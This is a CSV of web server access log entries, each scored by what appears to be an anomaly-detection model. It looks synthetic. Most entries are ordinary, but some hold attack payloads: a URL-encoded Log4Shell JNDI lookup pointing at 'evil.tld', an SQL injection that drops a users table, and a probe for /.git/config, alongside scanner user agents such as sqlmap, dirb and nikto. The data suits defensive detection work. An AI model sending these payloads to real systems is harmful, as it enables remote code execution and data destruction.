score_content,score_session,score_fused,line
1.4831026792526245,109.13310241699219,55.308102548122406,{"remote_addr": "79.149.191.28", "time_local": "11/Jan/2025:09:00:00 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8152, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.381147861480713,633.2349853515625,318.8080666065216,{"remote_addr": "113.163.140.198", "time_local": "11/Jan/2025:09:00:01 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 8602, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.527186870574951,820.6599731445312,412.5935800075531,{"remote_addr": "63.184.97.127", "time_local": "11/Jan/2025:09:00:01 -0700", "request": "HEAD /search?q=monitor HTTP/2", "status": 204, "body_bytes_sent": 12637, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.171562910079956,564.1826782226562,282.6771205663681,{"remote_addr": "232.124.172.1", "time_local": "11/Jan/2025:09:00:02 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 5128, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.3700976371765137,814.198974609375,408.28453612327576,{"remote_addr": "104.43.52.231", "time_local": "11/Jan/2025:09:00:03 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 7846, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.948920488357544,68.7899169921875,35.36941874027252,{"remote_addr": "18.174.189.49", "time_local": "11/Jan/2025:09:00:04 -0700", "request": "PUT /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 12684, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.866243362426758,583.8016967773438,293.33397006988525,{"remote_addr": "240.112.217.146", "time_local": "11/Jan/2025:09:00:04 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 15122, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.736257553100586,59.613853454589844,32.175055503845215,{"remote_addr": "92.9.240.187", "time_local": "11/Jan/2025:09:00:05 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 11274, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.03458833694458,767.799072265625,385.4168303012848,{"remote_addr": "11.46.160.128", "time_local": "11/Jan/2025:09:00:06 -0700", "request": "DELETE /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 14989, "http_referer": "-", "http_user_agent": "dirb/2.22"}
2.6362175941467285,85.06761169433594,43.85191464424133,{"remote_addr": "102.150.171.22", "time_local": "11/Jan/2025:09:00:07 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 13023, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
5.965737342834473,585.3180541992188,295.6418957710266,{"remote_addr": "112.32.217.161", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS / HTTP/2", "status": 200, "body_bytes_sent": 9036, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
5.942375183105469,2096.037353515625,1050.9898643493652,{"remote_addr": "196.196.129.142", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 301, "body_bytes_sent": 14422, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
2.6358964443206787,54.689910888671875,28.662903666496277,{"remote_addr": "169.45.210.229", "time_local": "11/Jan/2025:09:00:09 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 2895, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.161644458770752,580.9759521484375,291.0687983036041,{"remote_addr": "248.130.66.97", "time_local": "11/Jan/2025:09:00:10 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8937, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.345281958580017,2169.42236328125,1085.383822619915,{"remote_addr": "185.57.219.142", "time_local": "11/Jan/2025:09:00:11 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 10388, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
1.3363333940505981,69.69483184814453,35.515582621097565,{"remote_addr": "239.139.226.183", "time_local": "11/Jan/2025:09:00:12 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 9360, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
7.483014106750488,826.5802612304688,417.0316376686096,{"remote_addr": "98.157.147.67", "time_local": "11/Jan/2025:09:00:13 -0700", "request": "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 4767, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
5.9791460037231445,639.775146484375,322.8771462440491,{"remote_addr": "19.231.59.58", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 17320, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.791208744049072,878.2752075195312,441.53320813179016,{"remote_addr": "140.152.115.152", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16360, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
1.4510852098464966,82.23106384277344,41.84107452630997,{"remote_addr": "23.14.97.145", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "GET /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 6917, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.7367267608642578,725.3115234375,363.52412509918213,{"remote_addr": "190.132.180.109", "time_local": "11/Jan/2025:09:00:15 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3159, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
11.440587997436523,807.0374755859375,409.239031791687,{"remote_addr": "117.254.9.27", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16184, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.6281206607818604,724.9862060546875,363.3071633577347,{"remote_addr": "118.61.190.217", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11051, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
4.988338947296143,727.3143310546875,366.1513350009918,{"remote_addr": "120.114.183.51", "time_local": "11/Jan/2025:09:00:17 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 2701, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
2.161022663116455,533.1647338867188,267.6628782749176,{"remote_addr": "171.235.162.203", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "PUT /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 12193, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.6676939725875854,122.06318664550781,61.8654403090477,{"remote_addr": "30.130.241.15", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "POST /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 10140, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.439294815063477,832.3108520507812,418.37507343292236,{"remote_addr": "178.5.5.164", "time_local": "11/Jan/2025:09:00:19 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 6157, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.1884245872497559,1881.735107421875,941.4617660045624,{"remote_addr": "94.197.246.201", "time_local": "11/Jan/2025:09:00:20 -0700", "request": "GET /profile HTTP/2", "status": 302, "body_bytes_sent": 7225, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
5.340182781219482,5729.2861328125,2867.3131577968597,{"remote_addr": "136.243.61.144", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 400, "body_bytes_sent": 465, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.3694324493408203,774.423583984375,387.8965082168579,{"remote_addr": "248.65.188.195", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
5.826987266540527,569.797119140625,287.81205320358276,{"remote_addr": "194.136.81.21", "time_local": "11/Jan/2025:09:00:22 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 5647, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.4076240062713623,2091.9326171875,1046.6701205968857,{"remote_addr": "173.33.104.27", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 709, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
4.480152130126953,794.5819091796875,399.5310306549072,{"remote_addr": "73.73.102.83", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 5703, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
2.1414272785186768,5877.9755859375,2940.0585066080093,{"remote_addr": "251.132.164.48", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 373, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
